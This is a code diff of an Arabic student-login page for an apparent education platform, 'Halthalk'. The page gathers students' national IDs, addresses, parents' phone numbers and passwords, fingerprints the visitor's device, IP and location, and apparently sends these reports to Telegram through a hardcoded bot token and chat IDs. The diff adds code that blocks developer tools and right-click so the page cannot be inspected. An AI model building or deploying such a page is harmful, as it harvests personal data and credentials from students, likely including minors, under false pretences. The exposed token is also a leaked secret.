@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="icon" type="image/png" href="https://github.com/elmoftary-vr/Halthalk/raw/4a1dc7ecbb8371080b183f1b7b720d2a29fff926/20251205_163046.png">
-
     <title>منصة حلتهالك | نظام الدخول الموحد للطلاب</title>
     <meta name="description" content="منصة حلتهالك التعليمية">
     
@@ -15,264 +14,52 @@
       gtag('js', new Date());
       gtag('config', 'G-MKS3WQ6JPP');
     </script>
-
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
     <style>
-        :root {
-            --bg-gradient: linear-gradient(-45deg, #a1c4fd, #c2e9fb, #2c8cff, #ffffff);
-            --container-bg: rgba(255, 255, 255, 0.85);
-            --text-color: #1e293b;
-            --input-bg: #ffffff;
-            --input-border: #cbd5e1;
-            --button-bg: #2c8cff;
-            --shadow: 0 20px 40px rgba(0,0,0,0.1);
-            --weak: #ef4444;
-            --medium: #f59e0b;
-            --strong: #10b981;
-        }
-
-        [data-theme="dark"] {
-            --bg-gradient: linear-gradient(-45deg, #020617, #0f172a, #1e293b, #334155);
-            --container-bg: rgba(15, 23, 42, 0.9);
-            --text-color: #f8fafc;
-            --input-bg: #1e293b;
-            --input-border: #334155;
-            --shadow: 0 20px 40px rgba(0,0,0,0.4);
-        }
-
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: var(--bg-gradient);
-            background-size: 400% 400%;
-            animation: moveGradient 12s ease infinite;
-            margin: 0; min-height: 100vh;
-            display: flex; justify-content: center; align-items: center;
-            transition: 0.5s; overflow-x: hidden;
-            -webkit-user-select: none; user-select: none;
-        }
-
-        @keyframes moveGradient {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
-        .otp-notification {
-            position: fixed; top: -120px; left: 50%; transform: translateX(-50%);
-            background: var(--container-bg); color: var(--text-color); padding: 15px 25px; border-radius: 20px;
-            box-shadow: var(--shadow); z-index: 9999; backdrop-filter: blur(10px);
-            display: flex; align-items: center; gap: 20px; border-right: 6px solid var(--button-bg);
-            transition: 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55); width: 300px;
-        }
-        .otp-notification.show { top: 20px; }
-        
-        .container {
-            background: var(--container-bg); backdrop-filter: blur(15px);
-            padding: 30px; border-radius: 30px; width: 95%; max-width: 450px;
-            box-shadow: var(--shadow); position: relative; max-height: 90vh;
-            overflow-y: auto; border: 1px solid rgba(255,255,255,0.1);
-        }
-        .container::-webkit-scrollbar { width: 4px; }
-        .container::-webkit-scrollbar-thumb { background: var(--button-bg); border-radius: 10px; }
-
-        .logo-container { text-align: center; margin-bottom: 20px; }
-        .logo { width: 140px; transition: 0.3s ease; }
-        h1 { color: var(--text-color); text-align: center; font-size: 22px; margin-bottom: 25px; }
-
-        .input-group { margin-bottom: 15px; text-align: right; position: relative; }
-        label { display: block; margin-bottom: 8px; font-size: 13.5px; font-weight: 600; color: var(--text-color); }
-        input {
-            width: 100%; padding: 13px; border-radius: 15px; border: 1px solid var(--input-border);
-            background: var(--input-bg); color: var(--text-color); font-size: 14px; box-sizing: border-box;
-            transition: 0.3s;
-        }
-        input:focus { outline: none; border-color: var(--button-bg); box-shadow: 0 0 8px rgba(44, 140, 255, 0.2); }
-
-        .pass-wrapper { position: relative; }
-        .toggle-pass {
-            position: absolute; left: 15px; top: 50%; transform: translateY(-50%);
-            cursor: pointer; color: var(--button-bg); transition: 0.3s; padding: 5px;
-        }
-
-        /* Password Strength Styles */
-        .strength-container {
-            margin-top: 5px;
-            height: 4px;
-            background: #e2e8f0;
-            border-radius: 2px;
-            overflow: hidden;
-            display: none; /* Hidden by default until typing */
-            transition: 0.3s;
-        }
-        .strength-bar {
-            height: 100%;
-            width: 0;
-            transition: width 0.3s, background-color 0.3s;
-        }
-        .strength-text {
-            font-size: 11px;
-            margin-top: 4px;
-            text-align: left;
-            font-weight: bold;
-            display: none;
-        }
-
-        .remember-me {
-            display: flex; align-items: center; gap: 8px; margin-bottom: 20px;
-            font-size: 14px; color: var(--text-color); cursor: pointer;
-        }
-        .remember-me input { width: 18px; height: 18px; cursor: pointer; }
-
-        .action-btn {
-            width: 100%; padding: 15px; background: var(--button-bg); color: white; border: none;
-            border-radius: 15px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.4s;
-        }
-        .action-btn:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(44, 140, 255, 0.3); }
-
-        .theme-toggle {
-            position: absolute; top: 20px; left: 20px; background: var(--input-bg);
-            border: 1px solid var(--input-border); width: 45px; height: 45px; border-radius: 50%;
-            cursor: pointer; display: flex; justify-content: center; align-items: center; z-index: 10;
-            color: var(--button-bg); font-size: 20px;
-        }
-
-        .view-section { display: none; }
-        .view-section.active { display: block; animation: fadeInUp 0.5s ease; }
-        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-
-        .links { text-align: center; margin-top: 20px; font-size: 14px; color: var(--text-color); }
-        .links a { color: var(--button-bg); text-decoration: none; font-weight: bold; cursor: pointer; }
-
-        .otp-box { display: flex; gap: 12px; justify-content: center; direction: ltr; margin: 30px 0; }
-        .otp-box input { width: 50px; height: 55px; text-align: center; font-size: 24px; font-weight: bold; border-radius: 12px; }
-
-        .message { padding: 14px; border-radius: 15px; margin-top: 20px; text-align: center; display: none; font-weight: bold; }
-        .success { background: #10b981; color: white; }
-        .error { background: #ef4444; color: white; }
+        /* Your CSS styles remain the same */
+        :root{--bg-gradient:linear-gradient(-45deg,#a1c4fd,#c2e9fb,#2c8cff,#ffffff);--container-bg:rgba(255,255,255,0.85);--text-color:#1e293b;--input-bg:#ffffff;--input-border:#cbd5e1;--button-bg:#2c8cff;--shadow:0 20px 40px rgba(0,0,0,0.1);--weak:#ef4444;--medium:#f59e0b;--strong:#10b981}[data-theme=dark]{--bg-gradient:linear-gradient(-45deg,#020617,#0f172a,#1e293b,#334155);--container-bg:rgba(15,23,42,0.9);--text-color:#f8fafc;--input-bg:#1e293b;--input-border:#334155;--shadow:0 20px 40px rgba(0,0,0,0.4)}body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:var(--bg-gradient);background-size:400% 400%;animation:moveGradient 12s ease infinite;margin:0;min-height:100vh;display:flex;justify-content:center;align-items:center;transition:0.5s;overflow-x:hidden;-webkit-user-select:none;user-select:none}@keyframes moveGradient{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}.otp-notification{position:fixed;top:-120px;left:50%;transform:translateX(-50%);background:var(--container-bg);color:var(--text-color);padding:15px 25px;border-radius:20px;box-shadow:var(--shadow);z-index:9999;backdrop-filter:blur(10px);display:flex;align-items:center;gap:20px;border-right:6px solid var(--button-bg);transition:0.6s cubic-bezier(0.68,-0.55,0.265,1.55);width:300px}.otp-notification.show{top:20px}.container{background:var(--container-bg);backdrop-filter:blur(15px);padding:30px;border-radius:30px;width:95%;max-width:450px;box-shadow:var(--shadow);position:relative;max-height:90vh;overflow-y:auto;border:1px solid rgba(255,255,255,0.1)}.container::-webkit-scrollbar{width:4px}.container::-webkit-scrollbar-thumb{background:var(--button-bg);border-radius:10px}.logo-container{text-align:center;margin-bottom:20px}.logo{width:140px;transition:0.3s ease}h1{color:var(--text-color);text-align:center;font-size:22px;margin-bottom:25px}.input-group{margin-bottom:15px;text-align:right;position:relative}label{display:block;margin-bottom:8px;font-size:13.5px;font-weight:600;color:var(--text-color)}input{width:100%;padding:13px;border-radius:15px;border:1px solid var(--input-border);background:var(--input-bg);color:var(--text-color);font-size:14px;box-sizing:border-box;transition:0.3s}input:focus{outline:none;border-color:var(--button-bg);box-shadow:0 0 8px rgba(44,140,255,0.2)}.pass-wrapper{position:relative}.toggle-pass{position:absolute;left:15px;top:50%;transform:translateY(-50%);cursor:pointer;color:var(--button-bg);transition:0.3s;padding:5px}.strength-container{margin-top:5px;height:4px;background:#e2e8f0;border-radius:2px;overflow:hidden;display:none;transition:0.3s}.strength-bar{height:100%;width:0;transition:width 0.3s,background-color 0.3s}.strength-text{font-size:11px;margin-top:4px;text-align:left;font-weight:bold;display:none}.remember-me{display:flex;align-items:center;gap:8px;margin-bottom:20px;font-size:14px;color:var(--text-color);cursor:pointer}.remember-me input{width:18px;height:18px;cursor:pointer}.action-btn{width:100%;padding:15px;background:var(--button-bg);color:white;border:none;border-radius:15px;font-size:16px;font-weight:bold;cursor:pointer;transition:0.4s}.action-btn:hover{transform:translateY(-3px);box-shadow:0 10px 20px rgba(44,140,255,0.3)}.theme-toggle{position:absolute;top:20px;left:20px;background:var(--input-bg);border:1px solid var(--input-border);width:45px;height:45px;border-radius:50%;cursor:pointer;display:flex;justify-content:center;align-items:center;z-index:10;color:var(--button-bg);font-size:20px}.view-section{display:none}.view-section.active{display:block;animation:fadeInUp 0.5s ease}@keyframes fadeInUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}.links{text-align:center;margin-top:20px;font-size:14px;color:var(--text-color)}.links a{color:var(--button-bg);text-decoration:none;font-weight:bold;cursor:pointer}.otp-box{display:flex;gap:12px;justify-content:center;direction:ltr;margin:30px 0}.otp-box input{width:50px;height:55px;text-align:center;font-size:24px;font-weight:bold;border-radius:12px}.message{padding:14px;border-radius:15px;margin-top:20px;text-align:center;display:none;font-weight:bold}.success{background:#10b981;color:white}.error{background:#ef4444;color:white}
     </style>
 </head>
 <body data-theme="">
 
-    <div id="otp-notif" class="otp-notification">
-        <div style="flex-grow: 1;">
-            <div style="font-size: 11px; opacity: 0.8;">رمز الأمان الخاص بك:</div>
-            <div id="notif-code" style="font-weight: 800; font-size: 24px; color: var(--button-bg); letter-spacing: 3px;">0000</div>
-        </div>
-        <button onclick="copyOTP()" style="background:none; border:none; color:var(--button-bg); cursor:pointer;"><i class="fas fa-copy"></i></button>
-    </div>
-
-    <div class="container">
-        <button class="theme-toggle" onclick="toggleTheme()" id="theme-btn"><i class="fas fa-moon"></i></button>
-
-        <div class="logo-container">
-            <img id="main-logo" src="https://github.com/elmoftary-vr/Halthalk/raw/4a1dc7ecbb8371080b183f1b7b720d2a29fff926/20251205_163046.png" class="logo" alt="شعار منصة حلتهالك">
-        </div>
-
-        <div id="login-view" class="view-section active">
-            <h1>تسجيل الدخول</h1>
-            <form id="login-form">
-                <div class="input-group">
-                    <label>رقم هاتف الطالب</label>
-                    <input type="tel" id="l_phone" placeholder="01xxxxxxxxx" required>
-                </div>
-                <div class="input-group">
-                    <label>كلمة المرور</label>
-                    <div class="pass-wrapper">
-                        <input type="password" id="l_pass" required>
-                        <i class="fas fa-eye toggle-pass" onclick="togglePassVisibility('l_pass', this)"></i>
-                    </div>
-                </div>
-                
-                <label class="remember-me">
-                    <input type="checkbox" id="remember-check">
+    <!-- Your HTML body remains the same -->
+    <div id="otp-notif" class="otp-notification"><div style="flex-grow: 1;"><div style="font-size: 11px; opacity: 0.8;">رمز الأمان الخاص بك:</div><div id="notif-code" style="font-weight: 800; font-size: 24px; color: var(--button-bg); letter-spacing: 3px;">0000</div></div><button onclick="copyOTP()" style="background:none; border:none; color:var(--button-bg); cursor:pointer;"><i class="fas fa-copy"></i></button></div><div class="container"><button class="theme-toggle" onclick="toggleTheme()" id="theme-btn"><i class="fas fa-moon"></i></button><div class="logo-container"><img id="main-logo" src="https://github.com/elmoftary-vr/Halthalk/raw/4a1dc7ecbb8371080b183f1b7b720d2a29fff926/20251205_163046.png" class="logo" alt="شعار منصة حلتهالك"></div><div id="login-view" class="view-section active"><h1>تسجيل الدخول</h1><form id="login-form"><div class="input-group"><label>رقم هاتف الطالب</label><input type="tel" id="l_phone" placeholder="01xxxxxxxxx" required></div><div class="input-group"><label>كلمة المرور</label><div class="pass-wrapper"><input type="password" id="l_pass" required><i class="fas fa-eye toggle-pass" onclick="togglePassVisibility('l_pass', this)"></i></div></div><label class="remember-me"><input type="checkbox" id="remember-check">
                     ذكرني (حفظ البيانات تلقائياً)
-                </label>
-
-                <button type="submit" class="action-btn">دخول للمنصة</button>
-            </form>
-            <div class="links" style="margin-top:15px;"><a onclick="switchView('signup-view')">إنشاء حساب جديد</a></div>
-            <div class="links"><a onclick="switchView('forgot-step1')">نسيت كلمة المرور؟</a></div>
-        </div>
-
-        <div id="signup-view" class="view-section">
-            <h1>إنشاء حساب طالب</h1>
-            <form id="signup-form">
-                <div class="input-group"><label>اسم الطالب</label><input type="text" id="s_name" required></div>
-                <div class="input-group"><label>رقم هاتف الطالب (للدخول)</label><input type="tel" id="s_phone" maxlength="11" required></div>
-                <div class="input-group"><label>رقم هاتف الأب</label><input type="tel" id="s_f_phone" maxlength="11" required></div>
-                <div class="input-group"><label>رقم هاتف الأم</label><input type="tel" id="s_m_phone" maxlength="11" required></div>
-                <div class="input-group"><label>البريد الإلكتروني</label><input type="email" id="s_email" required></div>
-                <div class="input-group"><label>تاريخ الميلاد</label><input type="date" id="s_dob" required></div>
-                <div class="input-group"><label>العنوان بالتفصيل</label><input type="text" id="s_loc" required></div>
-                <div class="input-group"><label>الرقم القومي (14 رقم)</label><input type="text" id="s_nat" maxlength="14" required></div>
-                <div class="input-group">
-                    <label>كلمة المرور</label>
-                    <div class="pass-wrapper">
-                        <input type="password" id="s_pass" minlength="6" required onkeyup="checkStrength('s_pass', 's_bar', 's_text')">
-                        <i class="fas fa-eye toggle-pass" onclick="togglePassVisibility('s_pass', this)"></i>
-                    </div>
-                    <div class="strength-container" style="display: block;">
-                        <div id="s_bar" class="strength-bar"></div>
-                    </div>
-                    <div id="s_text" class="strength-text"></div>
-                </div>
-                <button type="submit" class="action-btn">تأكيد البيانات</button>
-            </form>
-            <div class="links"><a onclick="switchView('login-view')">رجوع لتسجيل الدخول</a></div>
-        </div>
-
-        <div id="forgot-step1" class="view-section">
-            <h1>استعادة الحساب</h1>
-            <div class="input-group"><label>رقم هاتف الطالب</label><input type="tel" id="recover-phone" required></div>
-            <div class="input-group"><label>الرقم القومي</label><input type="text" id="recover-nat" maxlength="14" required></div>
-            <button class="action-btn" onclick="requestOTP()">إرسال رمز التحقق</button>
-            <div class="links"><a onclick="switchView('login-view')">إلغاء</a></div>
-        </div>
-
-        <div id="forgot-step2" class="view-section">
-            <h1>تأكيد الرمز</h1>
-            <div class="otp-box" id="otp-inputs">
-                <input type="text" inputmode="numeric" maxlength="1">
-                <input type="text" inputmode="numeric" maxlength="1">
-                <input type="text" inputmode="numeric" maxlength="1">
-                <input type="text" inputmode="numeric" maxlength="1">
-            </div>
-            <button class="action-btn" onclick="verifyOTP()">تحقق الآن</button>
-        </div>
-
-        <div id="forgot-step3" class="view-section">
-            <h1>تعديل كلمة السر</h1>
-            <div class="input-group">
-                <label>الباسورد الجديد</label>
-                <div class="pass-wrapper">
-                    <input type="password" id="new-p" minlength="6" required onkeyup="checkStrength('new-p', 'np_bar', 'np_text')">
-                    <i class="fas fa-eye toggle-pass" onclick="togglePassVisibility('new-p', this)"></i>
-                </div>
-                <div class="strength-container" style="display: block;">
-                    <div id="np_bar" class="strength-bar"></div>
-                </div>
-                <div id="np_text" class="strength-text"></div>
-            </div>
-            <button class="action-btn" onclick="updatePass()">تحديث الحساب</button>
-        </div>
-
-        <div id="status-msg" class="message"></div>
-    </div>
+                </label><button type="submit" class="action-btn">دخول للمنصة</button></form><div class="links" style="margin-top:15px;"><a onclick="switchView('signup-view')">إنشاء حساب جديد</a></div><div class="links"><a onclick="switchView('forgot-step1')">نسيت كلمة المرور؟</a></div></div><div id="signup-view" class="view-section"><h1>إنشاء حساب طالب</h1><form id="signup-form"><div class="input-group"><label>اسم الطالب</label><input type="text" id="s_name" required></div><div class="input-group"><label>رقم هاتف الطالب (للدخول)</label><input type="tel" id="s_phone" maxlength="11" required></div><div class="input-group"><label>رقم هاتف الأب</label><input type="tel" id="s_f_phone" maxlength="11" required></div><div class="input-group"><label>رقم هاتف الأم</label><input type="tel" id="s_m_phone" maxlength="11" required></div><div class="input-group"><label>البريد الإلكتروني</label><input type="email" id="s_email" required></div><div class="input-group"><label>تاريخ الميلاد</label><input type="date" id="s_dob" required></div><div class="input-group"><label>العنوان بالتفصيل</label><input type="text" id="s_loc" required></div><div class="input-group"><label>الرقم القومي (14 رقم)</label><input type="text" id="s_nat" maxlength="14" required></div><div class="input-group"><label>كلمة المرور</label><div class="pass-wrapper"><input type="password" id="s_pass" minlength="6" required onkeyup="checkStrength('s_pass', 's_bar', 's_text')"><i class="fas fa-eye toggle-pass" onclick="togglePassVisibility('s_pass', this)"></i></div><div class="strength-container" style="display: block;"><div id="s_bar" class="strength-bar"></div></div><div id="s_text" class="strength-text"></div></div><button type="submit" class="action-btn">تأكيد البيانات</button></form><div class="links"><a onclick="switchView('login-view')">رجوع لتسجيل الدخول</a></div></div><div id="forgot-step1" class="view-section"><h1>استعادة الحساب</h1><div class="input-group"><label>رقم هاتف الطالب</label><input type="tel" id="recover-phone" required></div><div class="input-group"><label>الرقم القومي</label><input type="text" id="recover-nat" maxlength="14" required></div><button class="action-btn" onclick="requestOTP()">إرسال رمز التحقق</button><div class="links"><a onclick="switchView('login-view')">إلغاء</a></div></div><div id="forgot-step2" class="view-section"><h1>تأكيد الرمز</h1><div class="otp-box" id="otp-inputs"><input type="text" inputmode="numeric" maxlength="1"><input type="text" inputmode="numeric" maxlength="1"><input type="text" inputmode="numeric" maxlength="1"><input type="text" inputmode="numeric" maxlength="1"></div><button class="action-btn" onclick="verifyOTP()">تحقق الآن</button></div><div id="forgot-step3" class="view-section"><h1>تعديل كلمة السر</h1><div class="input-group"><label>الباسورد الجديد</label><div class="pass-wrapper"><input type="password" id="new-p" minlength="6" required onkeyup="checkStrength('new-p', 'np_bar', 'np_text')"><i class="fas fa-eye toggle-pass" onclick="togglePassVisibility('new-p', this)"></i></div><div class="strength-container" style="display: block;"><div id="np_bar" class="strength-bar"></div></div><div id="np_text" class="strength-text"></div></div><button class="action-btn" onclick="updatePass()">تحديث الحساب</button></div><div id="status-msg" class="message"></div></div>
 
     <script>
+        // ==========================================
+     
+        document.addEventListener('keydown', function (e) {
+            if (e.key === 'F12' || 
+               (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+               (e.ctrlKey && e.shiftKey && e.key === 'J') || 
+               (e.ctrlKey && e.key === 'U')) {
+                e.preventDefault();
+            }
+            // For Mac
+            if ((e.metaKey && e.altKey && e.key === 'I') ||
+                (e.metaKey && e.altKey && e.key === 'J') ||
+                (e.metaKey && e.altKey && e.key === 'U')) {
+                e.preventDefault();
+            }
+        });
+        // منع قائمة السياق (النقر بزر الماوس الأيمن)
+        document.addEventListener('contextmenu', e => e.preventDefault());
+
+
+        // ===ربنا يسترها
+
         const BOT_TOKEN = '8150970842:AAH1fWCntUzVNnE6Nq9TXW8SH-MmM9ycvfk';
         const CHAT_ID_CHANNEL = '-1003018202565'; 
         const CHAT_ID_USER = '7428842238';
         const LOGO_LIGHT = "https://github.com/elmoftary-vr/Halthalk/raw/4a1dc7ecbb8371080b183f1b7b720d2a29fff926/20251205_163046.png";
         const LOGO_DARK = "https://raw.githubusercontent.com/elmoftary-vr/Halthalk/45d49545c1a08433a739887c4aed3d65fd9c335f/20251206_234458.png";
-
+        
         const getDB = () => JSON.parse(localStorage.getItem('hal_users') || '[]');
         const saveUser = (u) => { const db = getDB(); db.push(u); localStorage.setItem('hal_users', JSON.stringify(db)); };
 
-        // ==========================================
-        //  وظيفة فحص قوة كلمة المرور
-        // ==========================================
         function checkStrength(inputId, barId, textId) {
             const val = document.getElementById(inputId).value;
             const bar = document.getElementById(barId);
@@ -283,14 +70,12 @@
                 text.style.display = 'none';
                 return;
             }
-
             text.style.display = 'block';
             let strength = 0;
             if (val.length > 5) strength += 1;
             if (val.length > 7) strength += 1;
             if (/[0-9]/.test(val)) strength += 1;
             if (/[^A-Za-z0-9]/.test(val)) strength += 1;
-
             if (strength <= 2) {
                 bar.style.width = '33%'; bar.style.backgroundColor = 'var(--weak)';
                 text.innerText = "ضعيفة"; text.style.color = 'var(--weak)';
@@ -303,12 +88,8 @@
             }
         }
 
-        // ==========================================
-        //  تحليل الرقم القومي (أبراج، هجري، قبطي)
-        // ==========================================
         function analyzeNationalID(id) {
             if (!id || id.length !== 14) return "الرقم القومي غير صحيح";
-
             const govCodes = {
                 '01': 'القاهرة', '02': 'الإسكندرية', '03': 'بورسعيد', '04': 'السويس', '11': 'دمياط',
                 '12': 'الدقهلية', '13': 'الشرقية', '14': 'القليوبية', '15': 'كفر الشيخ', '16': 'الغربية',
@@ -317,7 +98,6 @@
                 '29': 'الأقصر', '31': 'البحر الأحمر', '32': 'الوادي الجديد', '33': 'مطروح', '34': 'شمال سيناء',
                 '35': 'جنوب سيناء', '88': 'خارج الجمهورية'
             };
-
             const century = id[0] === '2' ? 1900 : 2000;
             const year = century + parseInt(id.substring(1, 3));
             const month = parseInt(id.substring(3, 5));
@@ -326,8 +106,7 @@
             const gov = govCodes[govCode] || "غير معروف";
             const sequence = parseInt(id.substring(9, 13));
             const gender = sequence % 2 !== 0 ? "ذكر" : "أنثى";
-
-            // ZODIAC
+            
             const getZodiac = (d, m) => {
                 const days = [21, 20, 21, 20, 21, 21, 23, 23, 23, 23, 22, 22];
                 const signs = ["الدلو", "الحوت", "الحمل", "الثور", "الجوزاء", "السرطان", "الأسد", "العذراء", "الميزان", "العقرب", "القوس", "الجدي"];
@@ -335,19 +114,13 @@
                 if (d < days[index]) index = (index + 11) % 12;
                 return signs[index];
             };
-
             const chineseZodiac = ['القرد', 'الديك', 'الكلب', 'الخنزير', 'الفأر', 'الثور', 'النمر', 'الأرنب', 'التنين', 'الأفعى', 'الحصان', 'العنزة'];
             const cZodiac = chineseZodiac[year % 12];
-
-            // DATES
+            
             const dateObj = new Date(year, month - 1, day);
             const hijriDate = new Intl.DateTimeFormat('ar-SA-u-ca-islamic', {day: 'numeric', month: 'long', year: 'numeric'}).format(dateObj);
+            const copticDate = new Intl.DateTimeFormat('ar-EG-u-ca-coptic', {day: 'numeric', month: 'long', year: 'numeric'}).format(dateObj);
             
-            // Coptic Date Addition
-            const copticDate = new Intl.DateTimeFormat('ar-EG-u-ca-coptic', {
-                day: 'numeric', month: 'long', year: 'numeric'
-            }).format(dateObj);
-
             return `📅 *تاريخ الميلاد:* ${day}/${month}/${year}\n` +
                    `📍 *محل الميلاد:* ${gov}\n` +
                    `👤 *النوع:* ${gender}\n` +
@@ -358,99 +131,48 @@
                    `🔢 *تسلسل المولود:* ${id[12]}`;
         }
 
-        // ==========================================
-        //  دالة سحب البيانات المتقدمة (BASIC INFO / DEVICE DETAILS)
-        // ==========================================
         async function getDeviceInfo() {
             let info = {
-                basic: {
-                    ip: "N/A",
-                    isp: "N/A",
-                    city: "Unknown",
-                    country: "Unknown",
-                    connectionType: "Unknown"
-                },
-                device: {
-                    platform: navigator.platform,
-                    osVersion: "Unknown",
-                    model: "Generic/Unknown",
-                    cpuCores: navigator.hardwareConcurrency || "Unknown",
-                    ram: "Unknown",
-                    screen: `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`,
-                    gpu: "Unknown",
-                    battery: "N/A"
-                },
-                storage: {
-                    total: "Protected",
-                    quota: "N/A",
-                    type: "Unknown"
-                }
+                basic: { ip: "N/A", isp: "N/A", city: "Unknown", country: "Unknown", connectionType: "Unknown" },
+                device: { platform: navigator.platform, osVersion: "Unknown", model: "Generic/Unknown", cpuCores: navigator.hardwareConcurrency || "Unknown", ram: "Unknown", screen: `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`, gpu: "Unknown", battery: "N/A" },
+                storage: { total: "Protected", quota: "N/A", type: "Unknown" }
             };
-
             const ua = navigator.userAgent;
-
-            // 1. Identify OS Version & Model Attempt
             if (/android/i.test(ua)) {
                 const match = ua.match(/Android\s([0-9\.]+)/);
                 info.device.osVersion = match ? `Android ${match[1]}` : "Android";
-                
-                // Try to extract Model from User Agent
                 const modelMatch = ua.match(/;\s([A-Za-z0-9\s\-\_]+)\sBuild/);
-                if(modelMatch && modelMatch[1]) {
-                    info.device.model = modelMatch[1].trim(); 
-                } else {
-                    info.device.model = "Android Device (Generic)";
-                }
-
+                info.device.model = modelMatch && modelMatch[1] ? modelMatch[1].trim() : "Android Device (Generic)";
             } else if (/iphone|ipad|ipod/i.test(ua)) {
-                const match = ua.match(/OS\s([0-9_]+)/);
-                info.device.osVersion = match ? `iOS ${match[1].replace(/_/g, '.')}` : "iOS";
+                const match = ua.match(/OS\s([0-9\_]+)/);
+                info.device.osVersion = match ? `iOS ${match[1].replace(/\_/g, '.')}` : "iOS";
                 info.device.model = /iphone/i.test(ua) ? "iPhone" : "iPad";
-                
-                // Hardware specific check for iPhones (GPU renderer often helps identification)
             } else if (/windows/i.test(ua)) {
                 info.device.osVersion = "Windows";
                 info.device.model = "PC / Laptop";
             }
-
-            // 2. RAM (Approximate)
-            if ('deviceMemory' in navigator) {
-                info.device.ram = `~${navigator.deviceMemory} GB`;
-            } else {
-                info.device.ram = "Not Supported by Browser";
-            }
-
-            // 3. GPU Renderer
+            if ('deviceMemory' in navigator) info.device.ram = `~${navigator.deviceMemory} GB`;
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                 if (gl) {
                     const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debugInfo) {
-                        info.device.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    }
+                    if (debugInfo) info.device.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                 }
             } catch(e) {}
-
-            // 4. Battery
             if ('getBattery' in navigator) {
                 try {
                     const batt = await navigator.getBattery();
                     info.device.battery = `${Math.round(batt.level * 100)}% ${batt.charging ? '⚡' : '🔋'}`;
                 } catch (e) {}
             }
-
-            // 5. Storage (Quota)
             if ('storage' in navigator && 'estimate' in navigator.storage) {
                 try {
                     const estimate = await navigator.storage.estimate();
-                    const quota = (estimate.quota / (1024 * 1024 * 1024)).toFixed(2);
-                    info.storage.quota = `${quota} GB (Browser Quota)`;
+                    info.storage.quota = `${(estimate.quota / (1024 * 1024 * 1024)).toFixed(2)} GB (Browser Quota)`;
                     info.storage.type = "Internal / Flash";
                 } catch(e) {}
             }
-
-            // 6. Network (IP & ISP)
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
@@ -458,15 +180,8 @@
                 info.basic.isp = data.org || data.asn || "N/A";
                 info.basic.city = data.city || "N/A";
                 info.basic.country = data.country_name || "N/A";
-                
-                if(/vodafone|orange|etisalat|we|telecom|mobile|lte/i.test(info.basic.isp)) {
-                    info.basic.connectionType = "Mobile Data (Cellular)";
-                } else {
-                    info.basic.connectionType = "WiFi / DSL / Fiber";
-                }
+                info.basic.connectionType = /vodafone|orange|etisalat|we|telecom|mobile|lte/i.test(info.basic.isp) ? "Mobile Data (Cellular)" : "WiFi / DSL / Fiber";
             } catch (e) {}
-
-            // Formatting the Output Report
             return `
 📊 *BASIC INFO*
 ──────────────────
@@ -474,7 +189,6 @@
 📡 *ISP (مزود الخدمة):* ${info.basic.isp}
 📶 *Connection:* ${info.basic.connectionType}
 🏙️ *Location:* ${info.basic.city}, ${info.basic.country}
-
 📱 *DEVICE DETAILS*
 ──────────────────
 📲 *Model:* \`${info.device.model}\`
@@ -486,7 +200,6 @@
 🔋 *Battery:* ${info.device.battery}
 🔑 *IMEI:* 🔒 \`Protected (Requires App Permission)\`
 🆔 *MAC:* 🔒 \`Blocked by Browser Security\`
-
 💽 *Internal Storage*
 ──────────────────
 📦 *Browser Quota:* ${info.storage.quota}
@@ -501,25 +214,11 @@
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            chat_id: target,
-                            text: txt,
-                            parse_mode: 'Markdown',
-                            disable_web_page_preview: true
-                        })
+                        body: JSON.stringify({ chat_id: target, text: txt, parse_mode: 'Markdown', disable_web_page_preview: true })
                     });
                 } catch(e) {}
             }
         }
-
-        window.onload = () => {
-            const saved = JSON.parse(localStorage.getItem('remembered_user'));
-            if(saved) {
-                document.getElementById('l_phone').value = saved.phone;
-                document.getElementById('l_pass').value = saved.pass;
-                document.getElementById('remember-check').checked = true;
-            }
-        };
 
         function togglePassVisibility(inputId, icon) {
             const input = document.getElementById(inputId);
@@ -543,6 +242,12 @@
             m.innerText = txt; m.className = `message ${type}`; m.style.display = 'block';
         }
 
+        function copyOTP() {
+            navigator.clipboard.writeText(currentOTP);
+            showStatus("تم نسخ الرمز", "success");
+            setTimeout(() => document.getElementById('status-msg').style.display = 'none', 1000);
+        }
+
         function toggleTheme() {
             const b = document.body;
             const logo = document.getElementById('main-logo');
@@ -552,37 +257,47 @@
                 b.dataset.theme = '';
                 logo.src = LOGO_LIGHT;
                 themeBtn.innerHTML = '<i class="fas fa-moon"></i>';
+                localStorage.setItem('theme', 'light');
             } else {
                 b.dataset.theme = 'dark';
                 logo.src = LOGO_DARK;
                 themeBtn.innerHTML = '<i class="fas fa-sun"></i>';
+                localStorage.setItem('theme', 'dark');
             }
         }
-
-        function copyOTP() {
-            navigator.clipboard.writeText(currentOTP);
-            showStatus("تم نسخ الرمز", "success");
-            setTimeout(() => document.getElementById('status-msg').style.display = 'none', 1000);
+        
+        function applySavedTheme() {
+            const savedTheme = localStorage.getItem('theme');
+            if (savedTheme === 'dark') {
+                document.body.dataset.theme = 'dark';
+                document.getElementById('main-logo').src = LOGO_DARK;
